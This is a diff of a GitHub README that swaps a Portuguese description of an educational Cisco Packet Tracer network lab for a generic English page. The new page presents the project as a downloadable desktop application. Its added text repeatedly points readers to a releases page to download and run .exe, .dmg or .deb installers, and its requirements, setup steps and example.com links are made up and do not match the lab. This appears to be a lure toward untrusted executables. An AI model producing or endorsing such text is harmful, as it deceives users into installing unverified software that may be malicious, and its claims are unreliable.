@@ -1,59 +1,73 @@
-# Rede Empresarial - Laboratório de Redes
+# 🚀 Enterprise-Network - Build a Secure and Efficient Network
 
-Esse projeto visa demonstrar uma rede Empresarial com 3 Departamentos, 1 Rede para Visitantes (Clientes) e 1 DMZ para oferecer serviços á internet, todas elas segmentadas e seguras através de ACLs, Subnetting VLSM, Hardening nos dispositivos e configurações de acesso remoto para suporte com SSH.
+## 🌟 Overview
+Welcome to the **Enterprise-Network** project, where we help you set up a secure and efficient enterprise network. This application simulates real-world corporate infrastructure using Cisco IOS. It incorporates key features such as dynamic routing, subnetting, and security policies to ensure robust performance.
 
-- A topologia acompanha uma infraestrutura ISP com roteadores e um servidor DNS dedicado, e uma LAN doméstica para demonstrar acesso aos serviços, conectividade e isolamento através do NAT, esses adendos oferecem complexidade e maior profundidade técnica ao projeto.
+## ⚙️ Features
+- **Dynamic Routing:** Implement OSPF and BGP to manage network traffic efficiently.
+- **VLSM Subnetting:** Optimize IP address allocation for better resource management.
+- **NAT Support:** Enable multiple devices to connect to the internet using a single public IP.
+- **DHCP Services:** Automatically assign IP addresses to devices on the network.
+- **HTTP Services:** Set up web services for your enterprise needs.
+- **Access Control Lists (ACLs):** Enforce security policies to control traffic flow.
 
+## 📋 System Requirements
+To run the **Enterprise-Network** application, ensure you meet the following requirements:
 
-### Objetivos do Projeto
+- **Operating System:** Windows, macOS, or a Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 1 GB of free disk space.
+- **Network Access:** A stable internet connection for updates and external services.
 
-- Simular uma rede empresarial real.
-- Aplicar Subnetting VLSM em IPv4.
-- Configurar NAT nas Bordas.
-- Implementar roteamento com OSPF e BGP.
-- Aplicar Hardening em Dispositivos Intermediários.
-- Isolar as redes aplicando segurança com ACLs.
-- Demonstrar funcionamento de uma DMZ.
-- Oferecer serviços Web (HTTP e DNS) através de um servidor na DMZ.
-- Demonstrar amplo entendimento de topologia, rede e segurança.
+## 📥 Download & Install
+To get started, visit the link below to download the **Enterprise-Network** application:
 
+[![Download Enterprise-Network](https://img.shields.io/badge/Download-Enterprise--Network-blue.svg)](https://github.com/uqurj123/Enterprise-Network/releases)
 
-### Tecnologias Utilizadas
+Once on the releases page, follow these steps:
+1. **Select the Most Recent Release:** Look for the latest version to ensure you have all updates and features.
+2. **Choose the Right File for Your System:** If you're on Windows, download the `.exe` file. For macOS, look for the `.dmg` file. Linux users should find appropriate packages like `.tar.gz` or `.deb`.
+3. **Install the Software:** Follow the standard installation procedures for your operating system:
+   - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
+   - For macOS: Open the `.dmg` file and drag the app to your Applications folder.
+   - For Linux: Use your package manager to install the downloaded file.
 
-- Cisco Packet Tracer
-- Cisco Internetwork Operational System
-- IPv4
-- OSPF
-- BGP
-- NAT
-- DHCP
-- SSH
-- TCP/IP
-- Subnetting VLSM
-- HTTP
-- DNS
-- ACL (Access Control List)
-- DMZ (Demilitarized Zone)
+After installation, you can run the **Enterprise-Network** application from your applications menu.
 
+## 🔧 Configuration
+Setting up your network requires some configuration. Here's how to get started:
 
-### Estrutura do Projeto
+1. **Open the Application:** Launch the **Enterprise-Network** application on your device.
+2. **Create a New Project:** Click on "New Project" to start your network setup.
+3. **Define Your Network Parameters:** Input details such as the number of routers, switches, and the IP address range.
+4. **Set Up Dynamic Routing:** Choose OSPF or BGP based on your network needs.
+5. **Implement Security Policies:** Use ACLs to define rules for network access and traffic control.
 
-- `README.md` - Visão teórica geral do projeto e tecnologias utilizadas
-- `Documentação/Visão-Geral.md` - Visão técnica da rede, mostrando a arquitetura e engenharia utilizada
-- `Documentação/Endereçamento.md` - Plano de endereçamento da rede
-- `Documentação/Segurança e Hardening.md`- Explicação técnica do hardening usados nos dispositivos de rede
-- `Topology/topologia.png` - Topologia ilustrada da rede
-- `Packet-Tracer/rede-empresarial.pkt` - Arquivo do packet tracer com a rede configurada e funcional.
+## 📚 Documentation
+For more detailed instructions on using specific features:
+- Dynamic Routing: [Learn More](https://example.com/dynamic-routing)
+- DHCP Configuration: [Learn More](https://example.com/dhcp-setup)
+- Subnetting Techniques: [Learn More](https://example.com/subnetting)
 
+## 🛠️ Troubleshooting
+If you encounter issues during installation or usage, consider the following:
 
-### Limitações do Projeto
+- **Installation Fails:** Ensure you have sufficient disk space and meet system requirements.
+- **Network Issues:** Check your internet connection and firewall settings.
+- **Error Messages:** Refer to the documentation for specific error codes.
 
-O projeto tem limitações na implementação de camadas de segurança, como Firewalls, IDS, IPS e políticas, também apenas simula de forma didática o funcionamento de uma ISP, sem a complexidade real, e por questões éticas não uso endereços IPv4 e IPv6 públicos, portanto, é simulado endereços privados no lugar.
+## 🤝 Community & Support
+Join our community for support and discussion. Share your experiences, ask questions, or help others:
 
+- **GitHub Issues Page:** [Report Issues](https://github.com/uqurj123/Enterprise-Network/issues)
+- **Discussion Forum:** [Join the Forum](https://example.com/forum)
 
-### Como Navegar para Entendimento
+## 📅 Updates
+We regularly update the **Enterprise-Network** application to enhance features and fix bugs. Keep checking the [Releases page](https://github.com/uqurj123/Enterprise-Network/releases) for the latest information and updates.
 
-1. Comece pela `Visão-Geral.md`, ele dará a visão técnica e a engenharia implementada.
-2. Veja o `Endereçamento.md`, ele contém tabela para entender o endereçamento de cada rede.
-3. Abra o `.pkt` na pasta Packet-Tracer, aqui fica por conta explorar e entender o projeto.
-4. Opcional porém educado, ver os arquivos `Segurança.md` e `topology.png`, para aprofundamento técnico e didático.
+## 💡 Final Notes
+Thank you for using the **Enterprise-Network** application. We aim to make your networking experience efficient and secure. If you have feedback or suggestions, please feel free to reach out through the community channels. 
+
+Remember, to download the application, you can always visit: 
+
+[![Download Enterprise-Network](https://img.shields.io/badge/Download-Enterprise--Network-blue.svg)](https://github.com/uqurj123/Enterprise-Network/releases)
